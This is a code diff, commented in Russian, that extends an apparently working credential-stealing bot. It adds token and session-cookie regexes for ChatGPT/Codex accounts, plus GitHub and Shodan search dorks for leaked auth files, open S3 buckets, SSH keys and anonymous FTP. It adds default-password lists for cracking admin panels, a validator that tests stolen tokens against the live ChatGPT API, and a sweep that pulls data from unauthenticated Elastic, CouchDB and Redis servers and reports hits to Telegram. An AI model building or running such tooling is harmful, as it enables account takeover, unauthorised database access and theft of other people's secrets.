@@ -716,6 +716,28 @@ KEY_PATTERNS = [
         [],
         False,
     ),
+    # 🎫 CODEX (ChatGPT Plus/Pro подписки): ~/.codex/auth.json — id_token и
+    # access_token JWT (RS256) + account_id. Дампится из dotfiles/логов/бэкапов.
+    (
+        "codex",
+        r"\"id_token\"\s*:\s*\"(eyJ[A-Za-z0-9_\-\.]{100,})\"",
+        [],
+        False,
+    ),
+    (
+        "codex",
+        r"\"access_token\"\s*:\s*\"(eyJ[A-Za-z0-9_\-\.]{100,})\"[^}]{0,400}\"account_id\"",
+        [],
+        False,
+    ),
+    # chatgpt web-сессия (next-auth) из дампов/логов = ChatGPT+Codex веб
+    # (оба формата: "Cookie: name=value" и netscape-дампы "name\tvalue")
+    (
+        "codex-web",
+        r"__Secure-next-auth\.session-token(?:=|\t)([A-Za-z0-9_\-\.]{200,})",
+        [],
+        False,
+    ),
     # Google session cookies (stealer-логи/экспорты): бег 3+ кук SID/HSID/SAPISID.
     # Разделитель [;\s] потребляется ТОЛЬКО между куками (lookahead), иначе матч
     # прилипает к следующему слову и режется boundary-чеком экстрактора.
@@ -1517,6 +1539,13 @@ class GitHubCode(Source):
             '"-- PostgreSQL database dump" extension:sql',
             '"EMAIL_HOST_PASSWORD" extension:env',
             '"discord.com/api/webhooks/" extension:env',
+            # 🎫 CODEX/CHATGPT: auth.json Codex CLI + веб-сессии
+            '"id_token" "account_id" "refresh_token" extension:json',
+            "path:.codex auth.json",
+            '"chatgpt-account-id"',
+            '"__Secure-next-auth.session-token" extension:txt',
+            '"chatgpt.com/backend-api/codex"',
+            '"subscriptionType" "max" extension:json',
             # 🔑 BASETEN: 8.32 ключи + trussrc (конфиг truss CLI = baseten-ключ)
             '"BASETEN_API_KEY"',
             "baseten path:.env",
@@ -2750,6 +2779,19 @@ class Shodan(Source):
         ('http.html:"smtp.163.com"', 1),
         ('http.html:"MAIL_PASSWORD"', 2),
         ('http.html:"EMAIL_HOST_PASSWORD"', 2),
+        # ============ 🎫 CODEX/CHATGPT-ПОДПИСКИ ============
+        ('http.html:".codex/auth.json"', 3),  # Codex CLI креды на вебрутах/в логах
+        ('http.title:"Index of /" ".codex"', 2),  # открытые листинги .codex
+        ('http.html:"chatgpt.com/backend-api/codex"', 2),  # codex-прокси релеи
+        ('http.html:"chatgpt-account-id"', 2),  # codex-прокси конфиги
+        ('http.html:"__Secure-next-auth.session-token"', 2),  # chatgpt веб-сессии
+        ('http.html:"subscriptionType"', 3),  # claude.json: план ВИДЕН прямо тут
+        # ============ 🪣 БАКЕТЫ/ЛИСТИНГИ: прямые дампы ============
+        ('http.html:"<ListBucketResult"', 3),  # ОТКРЫТЫЕ S3: .env/.sql качаются
+        ('http.title:"Index of /" ".env"', 3),
+        ('http.title:"Index of /" "id_rsa"', 2),
+        ('port:21 "230" "anonymous"', 2),  # анонимные FTP — классика дампов
+        ('port:873 "rsync"', 1),  # rsync-шары
     ]
 
     def _key_pool(self):
@@ -3027,6 +3069,13 @@ class Shodan(Source):
                                     "Set-Cookie:",
                                     "sessionKey",
                                     "session_id",
+                                    # 🎫 codex/подписки/дампы: структурные маркеры
+                                    "subscriptionType",
+                                    "chatgpt-account-id",
+                                    "__Secure-next-auth",
+                                    "ListBucketResult",
+                                    "auth.json",
+                                    "id_token",
                                 )
                             ):
                                 res.append(
@@ -5598,6 +5647,12 @@ class NewApiSweep(Source):
         ("admin", "admin123"),
         ("admin", "admin"),
         ("root", "admin123"),
+        ("root", "12345678"),
+        ("admin", "12345678"),
+        ("root", "toor"),
+        ("admin", "password"),
+        ("root", "password"),
+        ("admin", "admin888"),
     )
     # анти-спам TG: панель постится раз в 24ч (P1.1)
     CRACKED_STATE_PATH = os.path.join(HERE, "newapi_cracked.json")
@@ -9291,6 +9346,48 @@ def validate_jwt(key, origin):
     }
 
 
+def validate_codex(key, web=False):
+    """🎫 Codex/ChatGPT: живой токен = ChatGPT Plus/Pro подписка (Codex CLI +
+    веб). /backend-api/me отвечает профилем аккаунта. web=True — куки-сессия
+    __Secure-next-auth.session-token вместо Bearer."""
+    hdrs = {"User-Agent": UA["User-Agent"]}
+    if web:
+        hdrs["Cookie"] = "__Secure-next-auth.session-token=%s" % key
+    else:
+        hdrs["Authorization"] = "Bearer " + key
+    try:
+        r = http(
+            "GET",
+            "https://chatgpt.com/backend-api/me",
+            timeout=(6, 15),
+            headers=hdrs,
+        )
+        if r.status_code != 200:
+            return None
+        j = r.json()
+        email = j.get("email") or j.get("name") or "?"
+        # план: /backend-api/accounts/check не всегда доступен — фиксируем факт
+        return {
+            "key": key,
+            "base": "https://chatgpt.com/backend-api",
+            "tag": "codex-web" if web else "codex",
+            "origin": "codex-validator",
+            "ts": time.time(),
+            "models": ["gpt-5.2-codex", "gpt-5.2", "codex-mini"],
+            "n_models": 3,
+            "stars_listed": ["gpt-5.2-codex"],
+            "stars_working": ["gpt-5.2-codex"],
+            "balance": None,
+            "tier": "ChatGPT/Codex SUB (%s)" % email,
+            "usage": None,
+            "embed": None,
+            "rerank": None,
+            "status": "working",
+        }
+    except Exception:
+        return None
+
+
 def validate_anthropic(key):
     base = "https://api.anthropic.com"
     # OAuth токены (sk-ant-oat01) работают только через Bearer + oauth-beta хедер
@@ -9588,6 +9685,10 @@ def validate(key, base_hint, tag, origin):
         return validate_sendgrid(key)
     if tag == "google":
         return validate_google(key)
+    if tag == "codex":
+        return validate_codex(key)
+    if tag == "codex-web":
+        return validate_codex(key, web=True)
 
     bases = try_bases(base_hint, tag)
     bases = [b for b in bases if not bad_base(b)]  # мусорные base-hint'ы вон
@@ -11071,12 +11172,176 @@ def evolved_query_hit(query, n_items):
         pass
 
 
+def opendb_sweep(cycle):
+    """🗄️ OPEN-DB: открытые Elastic/Mongo/Redis/Couch по shodan — это СЫРЫЕ
+    ДАМПЫ (индексы/базы с токенами внутри). Elastic: список индексов + сэмпл
+    документов -> экстрактор -> валидация -> TG. Redis: PING без AUTH.
+    Раз в 2 цикла, 2 запроса к shodan за свип (бережём кредиты)."""
+    if cycle % 2:
+        return []
+    keys = Shodan()._key_pool()
+    if not keys:
+        return []
+    key = keys[0]
+    QUERIES = (
+        ('port:9200 "cluster_name"', "elastic"),
+        ('port:27017 "MongoDB"', "mongo"),
+        ('port:6379 "redis_version"', "redis"),
+        ('port:5984 "couchdb"', "couch"),
+    )
+    hosts, seen_h = [], set()
+    rot = (cycle // 2) % len(QUERIES)
+    for qi in (rot, (rot + 1) % len(QUERIES)):
+        q, kind = QUERIES[qi]
+        try:
+            r = requests.get(
+                "https://api.shodan.io/shodan/host/search",
+                params={"key": key, "query": q, "page": 1 + ((cycle // 2) % 10)},
+                timeout=(10, 30),
+                verify=False,
+            )
+            if r.status_code != 200:
+                continue
+            dport = {"elastic": 9200, "mongo": 27017, "redis": 6379, "couch": 5984}[
+                kind
+            ]
+            for mtc in (r.json().get("matches") or [])[:14]:
+                ip = mtc.get("ip_str")
+                if ip and ip not in seen_h:
+                    seen_h.add(ip)
+                    hosts.append((kind, ip, mtc.get("port") or dport))
+        except Exception:
+            continue
+    if not hosts:
+        return []
+    out = []
+
+    def probe(hp):
+        kind, ip, port = hp
+        base = "http://%s:%s" % (ip, port)
+        try:
+            if kind == "elastic":
+                r = requests.get(
+                    base + "/_cat/indices?format=json", timeout=(3, 6), verify=False
+                )
+                if r.status_code != 200:
+                    return []
+                idxs = r.json()
+                names = [
+                    i.get("index")
+                    for i in idxs
+                    if not str(i.get("index", "")).startswith(".")
+                ]
+                docs = sum(
+                    int(i.get("docs.count") or 0)
+                    for i in idxs
+                    if str(i.get("docs.count", "")).isdigit()
+                )
+                post_telegram(
+                    "🗄️ OPEN ELASTIC %s\n%d индексов, ~%d доков\n%s"
+                    % (base, len(idxs), docs, ", ".join(str(n) for n in names[:8]))
+                )
+                chunks = []
+                fat = sorted(
+                    (i for i in idxs if str(i.get("docs.count", "")).isdigit()),
+                    key=lambda x: -int(x.get("docs.count") or 0),
+                )
+                for i in fat[:2]:
+                    nm = i.get("index")
+                    if not nm or str(nm).startswith("."):
+                        continue
+                    rr = requests.get(
+                        "%s/%s/_search?size=3" % (base, nm),
+                        timeout=(4, 8),
+                        verify=False,
+                    )
+                    if rr.status_code == 200:
+                        chunks.append((rr.text[:200_000], "opendb:%s/%s" % (base, nm)))
+                return chunks
+            if kind == "couch":
+                r = requests.get(base + "/_all_dbs", timeout=(3, 6), verify=False)
+                if r.status_code == 200 and r.text.startswith("["):
+                    post_telegram("🗄️ OPEN COUCHDB %s — базы: %s" % (base, r.text[:200]))
+                    return [(r.text, "opendb:%s" % base)]
+                return []
+            if kind == "redis":
+                import socket as _sock
+
+                s = _sock.create_connection((ip, port), timeout=4)
+                s.sendall(b"*1\r\n$4\r\nPING\r\n")
+                resp = s.recv(64)
+                if b"PONG" in resp:
+                    s.sendall(b"*1\r\n$4\r\nINFO\r\n")
+                    info = s.recv(8192).decode("utf-8", errors="replace")
+                    kn = re.findall(r"db\d+:keys=(\d+)", info)
+                    post_telegram(
+                        "🗄️ OPEN REDIS %s:%s (no auth) — ключей: %s"
+                        % (ip, port, sum(map(int, kn)) if kn else "?")
+                    )
+                s.close()
+                return []
+            if kind == "mongo":
+                import socket as _sock
+
+                s = _sock.create_connection((ip, port), timeout=4)
+                s.close()
+                post_telegram("🗄️ OPEN MONGO %s:%s (tcp ok)" % (ip, port))
+                return []
+        except Exception:
+            return []
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+        for chunks in ex.map(probe, hosts):
+            if chunks:
+                out.extend(chunks)
+
+    # мини-пайплайн: сэмплы -> экстрактор -> приоритетная валидация -> стор/TG
+    try:
+        cands = {}
+        for txt, org in out:
+            for k, t, b in extract_candidates(txt):
+                h = khash(k, b)
+                if h not in cands:
+                    cands[h] = (k, t, b, org)
+        if not cands:
+            return out
+        seen = load_seen()
+        PRIO = ("anthropic", "codex", "codex-web", "db-dsn", "gcookie", "openai")
+        fresh = [(k, t, b, o) for h, (k, t, b, o) in cands.items() if h not in seen]
+        fresh.sort(key=lambda c: 0 if c[1] in PRIO else 1)
+        n_found = 0
+        done_h = []
+
+        def _val(f):
+            k, t, b, o = f
+            return validate(k, b, t, o)
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+            for v, f in zip(ex.map(_val, fresh[:40]), fresh[:40]):
+                done_h.append(khash(f[0], f[2]))
+                if v:
+                    store(v)
+                    post_finding_now(v, True)
+                    n_found += 1
+        for h in done_h:
+            seen.add(h)
+        save_seen(seen)
+        log(
+            "  🗄️ opendb: %d хостов, %d кандидатов, %d находок"
+            % (len(hosts), len(fresh), n_found)
+        )
+    except Exception as e:
+        log("opendb pipeline err: %s" % e)
+    return out
+
+
 def self_keysmith(cycle):
     """🔑 САМООБЕСПЕЧЕНИЕ: бот добывает НЕДОСТАЮЩИЕ ключи источников из чужих
     конфигов, валидирует боевым запросом и вписывает себе. fofa — в конфиг,
     shodan — в пул лейнов (каждый ключ = +своя квота кредитов к impact'у)."""
     _keysmith_fofa(cycle)
-    _keysmith_shodan(cycle)
+    # _keysmith_shodan ВЫКЛ: чужие шодан-ключи не нужны — edu-пула (193k/мес)
+    # хватает на полный impact. Функция оставлена: включить, если пул иссякнет.
 
 
 def _keysmith_fofa(cycle):
@@ -12134,6 +12399,11 @@ def main():
                 self_keysmith(cycle)
             except Exception:
                 pass
+            # OPEN-DB свип: открытые Elastic/Mongo/Redis = сырые дампы
+            try:
+                opendb_sweep(cycle)
+            except Exception as e:
+                log("opendb sweep err: %s" % e)
             # ревалидация каждые 4 цикла: чистим мёртвые ключи из стора
             if cycle % 4 == 0:
                 try:
